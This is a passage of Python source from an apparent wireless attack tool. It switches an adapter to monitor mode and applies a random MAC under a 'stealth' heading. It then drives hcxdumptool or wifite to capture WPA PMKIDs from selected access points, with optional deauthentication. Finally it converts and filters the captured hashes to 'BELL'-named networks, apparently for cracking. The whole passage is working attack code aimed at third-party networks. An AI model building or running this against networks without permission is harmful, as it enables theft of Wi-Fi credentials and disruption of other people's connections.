# capture: monitor mode, PMKID collection
# --------------------------------------------------------------------------


@dataclass
class MonitorSession:
    interface: str
    strategy: str
    original_kind: str = "managed"
    created: bool = False

    def cleanup(self, log: Log) -> None:
        if self.strategy == "physical" and self.created:
            run(["ip", "link", "set", self.interface, "down"], timeout=15)
            run(["iw", "dev", self.interface, "set", "type", "managed"], timeout=20)
            run(["ip", "link", "set", self.interface, "up"], timeout=15)
            if shutil.which("nmcli"):
                run(["nmcli", "device", "set", self.interface, "managed", "yes"], timeout=15)
                run(["nmcli", "device", "connect", self.interface], timeout=20)
            log(f"monitor: restored {self.interface} to managed mode")
        elif self.strategy == "airmon" and self.created:
            run(["airmon-ng", "stop", self.interface], timeout=30)
            if shutil.which("nmcli"):
                run(["nmcli", "device", "set", self.interface, "managed", "yes"], timeout=15)
            log(f"monitor: stopped {self.interface}")


def _monitor_mode_active(iface: str) -> bool:
    """Return True when `iw dev <iface> info` reports type monitor."""
    proc = run(["iw", "dev", iface, "info"], timeout=15)
    if proc.returncode != 0:
        return False
    return re.search(r"type\s+monitor\b", proc.stdout) is not None


def prepare_monitor(
    iface: str, strategy: str, log: Log
) -> MonitorSession:
    """Put the adapter into monitor mode.

    "physical" uses `iw dev X set monitor otherbss` so no virtual monitor
    interface is created. hcxdumptool's own guidance is to avoid virtual
    interfaces and to set monitor mode itself, so this is the closest match
    for a wifite-driven run.
    """
    session = MonitorSession(interface=iface, strategy=strategy)

    # capture needs root; fail early with a clear message instead of an
    # opaque "Operation not permitted"
    if os.geteuid() != 0:
        raise RuntimeError(
            f"monitor mode requires root: re-run with sudo "
            f"(e.g. `sudo {sys.argv[0]}`)"
        )

    info = run(["iw", "dev", iface, "info"], timeout=15)
    m = re.search(r"type\s+(\S+)", info.stdout)
    session.original_kind = m.group(1) if m else "managed"

    if strategy == "managed":
        log(f"monitor: using {iface} as-is ({session.original_kind})", "warn")
        return session

    if strategy == "physical":
        # Take only THIS interface out of NetworkManager's control so the
        # rest of the system (e.g. the wired uplink) keeps its connectivity.
        # Never stop NetworkManager as a whole.
        if shutil.which("nmcli"):
            run(["nmcli", "device", "disconnect", iface], timeout=15)
            run(["nmcli", "device", "set", iface, "managed", "no"], timeout=15)
        # Do NOT run `airmon-ng check kill`: it kills NetworkManager and
        # wpa_supplicant system-wide and would drop the user's internet.
        # Only this interface is taken out of NM's control above.
        # the adapter is often busy in managed mode; bring it down first so
        # the monitor-mode switch succeeds on the first try
        run(["ip", "link", "set", iface, "down"], timeout=15)

        drv = adapter_driver(iface)
        is_rt2800usb = "rt2800usb" in (drv or "").lower()

        last_err = ""
        for attempt in range(7):
            if is_rt2800usb:
                # rt2800usb: "otherbss" flag is unsupported (Invalid argument).
                # EBUSY occurs if type monitor is set without the interface up
                # or without a channel set first.  Use the sequence:
                #   ip link set up, then iw dev set type monitor.
                proc = run(
                    ["iw", "dev", iface, "set", "type", "monitor"], timeout=20
                )
                if proc.returncode == 0:
                    run(["ip", "link", "set", iface, "up"], timeout=15)
                    session.created = True
                    log(
                        f"monitor: {iface} switched to monitor mode "
                        f"(physical, rt2800usb, no virtual iface)",
                        "info",
                    )
                    return session
                last_err = proc.stderr.strip() or proc.stdout.strip()
                # interface may still be busy; bring it up, then retry
                run(["ip", "link", "set", iface, "up"], timeout=15)
            else:
                # original approach for other drivers: otherbss avoids virtual iface
                proc = run(
                    ["iw", "dev", iface, "set", "monitor", "otherbss"], timeout=20
                )
                if proc.returncode == 0:
                    run(["ip", "link", "set", iface, "up"], timeout=15)
                    session.created = True
                    log(
                        f"monitor: {iface} switched to monitor mode "
                        f"(physical, no virtual iface)",
                        "info",
                    )
                    return session
                last_err = proc.stderr.strip() or proc.stdout.strip()

            # interface may still be busy; retry after a short delay
            time.sleep(1 if not is_rt2800usb else 2)
            run(["ip", "link", "set", iface, "down"], timeout=15)

        run(["ip", "link", "set", iface, "up"], timeout=15)
        # restore NM management so the user is not left disconnected
        if shutil.which("nmcli"):
            run(["nmcli", "device", "set", iface, "managed", "yes"], timeout=15)
        raise RuntimeError(
            f"could not set {iface} to monitor mode: {last_err}"
        )

    if strategy == "airmon":
        proc = run(["airmon-ng", "start", iface], timeout=60)
        blob = proc.stdout + proc.stderr
        # airmon-ng prints "(monitor mode enabled on wlp1s0mon)"
        found = re.search(r"\(monitor mode enabled on ([^\s\)]+)\)", blob)
        if found:
            session.interface = found.group(1)
            session.created = True
            log(f"monitor: airmon-ng created {session.interface}")
        else:
            log("monitor: airmon-ng did not report a monitor interface", "warn")
        return session

    raise ValueError(f"unknown monitor strategy {strategy!r}")


def build_bpf_filter(targets: Sequence[Target], out_path: Path, log: Log) -> Optional[Path]:
    """Build a tcpdump BPF program matching the target APs.

    hcxdumptool requires a BPF program when a filter list is used, and the
    official recommendation is to always scope capture with BPF.
    """
    macs = [t.bssid for t in targets if t.bssid]
    if not macs:
        return None
    expr = " or ".join(f"wlan addr3 {mac}" for mac in macs)
    proc = run(
        ["tcpdump", "-s", "1024", "-y", "IEEE802_11_RADIO", expr, "-dd"],
        timeout=30,
    )
    if proc.returncode != 0 or not proc.stdout.strip():
        log(f"bpf: tcpdump failed: {proc.stderr.strip()[:160]}", "warn")
        return None
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(proc.stdout.strip() + "\n", encoding="utf-8")
    log(f"bpf: wrote filter for {len(macs)} AP(s) -> {out_path}")
    return out_path


def randomize_mac(iface: str, log: Log) -> bool:
    """Apply macchanger -A (random MAC).

    Note: hcxdumptool manages its own random MAC address space, so this only
    affects the interface state seen by other tooling (e.g. the deauth path).
    """
    if not have("macchanger"):
        log("stealth: macchanger is not installed, skipping MAC randomization",
            "warn")
        return False
    proc = run(["macchanger", "-A", iface], timeout=30)
    if proc.returncode != 0:
        log(f"stealth: macchanger failed: {proc.stderr.strip()[:120]}", "warn")
        return False
    log(f"stealth: random MAC applied to {iface}")
    return True


def capture_pmkids(
    targets: Sequence[Target],
    cfg: Config,
    workdir: Path,
    log: Log,
) -> Tuple[Optional[Path], List[Path]]:
    """Collect PMKIDs for the selected targets.

    Returns (pcapng_or_None, list_of_22000_files).
    """
    if not targets:
        raise RuntimeError("no targets selected for capture")

    backend = str(cfg.get("capture_backend") or "wifite")
    captures = workdir / "captures"
    hs_dir = workdir / "hs"
    captures.mkdir(parents=True, exist_ok=True)
    hs_dir.mkdir(parents=True, exist_ok=True)

    produced: List[Path] = []
    pcapng: Optional[Path] = None

    if backend == "hcxdumptool":
        stamp = time.strftime("%Y%m%d-%H%M%S")
        pcapng = captures / f"bell_{stamp}.pcapng"
        cmd = [
            "hcxdumptool",
            "-i",
            cfg.get("interface") or "",
            "-w",
            str(pcapng),
            "--rds=1",
        ]
        # hcxdumptool sets monitor mode itself and advises against third
        # party tools doing it, so the interface is handed over as is.
        channels = {t.channel for t in targets if t.channel}
        if len(channels) == 1:
            cmd += ["-c", str(channels.pop())]
        else:
            cmd.append("-F")
        if cfg.get("build_bpf"):
            bpf = build_bpf_filter(targets, captures / f"filter_{stamp}.bpf", log)
            if bpf:
                cmd += ["--bpf", str(bpf)]
                # --essidlist scopes capture to the selected SSIDs (the old
                # --filterlist_ap flag no longer exists in hcxdumptool 6.3.5).
                essids = captures / f"essids_{stamp}.txt"
                essids.write_text(
                    "\n".join(sorted({t.essid for t in targets})) + "\n",
                    encoding="utf-8",
                )
                cmd += ["--essidlist", str(essids)]
        timeout = int(cfg.get("pmkid_timeout") or 120)
        log(f"capture: hcxdumptool for {timeout}s")
        run(cmd, timeout=timeout + 30)
        if pcapng.exists() and pcapng.stat().st_size:
            log(f"capture: wrote {pcapng}")
        else:
            pcapng = None
            log("capture: hcxdumptool produced no capture", "warn")
    else:
        timeout = int(cfg.get("pmkid_timeout") or 120)
        cmd = [
            "wifite",
            "-i",
            cfg.get("interface") or "",
            "--pmkid",
            "--pmkid-timeout",
            str(timeout),
            "--skip-crack",
            "--kill",
            "-v",
        ]
        channels = {t.channel for t in targets if t.channel}
        if len(channels) == 1:
            cmd += ["-c", str(channels.pop())]
        if cfg.get("randomize_mac"):
            cmd.append("--mac")
        if cfg.get("allow_deauth"):
            cmd += ["--num-deauths", str(int(cfg.get("deauth_count") or 1))]
        log(f"capture: wifite --pmkid for {timeout}s per target")
        for target in targets:
            one = cmd + ["-b", target.bssid]
            log(f"capture: {target.essid} ({target.bssid})")
            run(one, timeout=timeout + 120, cwd=workdir)
        produced = sorted(hs_dir.glob("*.22000"))
        if produced:
            log(f"capture: wifite wrote {len(produced)} hash file(s)")
        else:
            log("capture: wifite produced no .22000 files", "warn")
    return pcapng, produced


def convert_and_filter(
    cfg: Config,
    workdir: Path,
    log: Log,
    pcapng: Optional[Path],
    captured: Sequence[Path],
    targets: Sequence[Target],
) -> Tuple[Optional[Path], List[HashEntry]]:
    """Convert captures to hc22000 and filter them to the BELL targets."""
    all_hashes = workdir / "all.22000"
    bell_hashes = workdir / "bell.22000"
    essid_list = workdir / "essids.txt"

    if pcapng and pcapng.exists():
        cmd = ["hcxpcapngtool", "-o", str(all_hashes), "-E", str(essid_list),
               str(pcapng)]
        log(f"convert: {' '.join(shlex.quote(c) for c in cmd)}")
        proc = run(cmd, timeout=180)
        if proc.returncode != 0:
            log(f"convert: hcxpcapngtool failed: {proc.stderr.strip()[:160]}",
                "error")
    elif captured:
        merged = all_hashes
        with merged.open("w", encoding="utf-8") as fh:
            for path in captured:
                fh.write(path.read_text(encoding="utf-8", errors="replace"))
        log(f"convert: merged {len(captured)} wifite hash file(s)")
    else:
        log("convert: nothing to convert", "warn")
        return None, []

    if not all_hashes.exists():
        return None, []

    regex = scope_regex(cfg)
    cmd = ["hcxhashtool", "-i", str(all_hashes), "-o", str(bell_hashes),
           f"--essid-regex={regex}"]
    log(f"filter: {' '.join(shlex.quote(c) for c in cmd)}")
    proc = run(cmd, timeout=120)
    if proc.returncode != 0 or not bell_hashes.exists():
        log("filter: hcxhashtool failed, filtering locally", "warn")
        entries = [
            e
            for e in load_22000(all_hashes)
            if re.search(regex, e.essid, re.IGNORECASE)
        ]
        write_22000(bell_hashes, entries)
    else:
        entries = load_22000(bell_hashes)

    if targets:
        wanted = {t.bssid for t in targets if t.bssid}
        if wanted:
            scoped = [e for e in entries if e.bssid in wanted]
            if scoped:
                entries = scoped
    log(f"filter: {len(entries)} hash(es) for {len({e.essid for e in entries})} ESSID(s)")
    return bell_hashes, entries


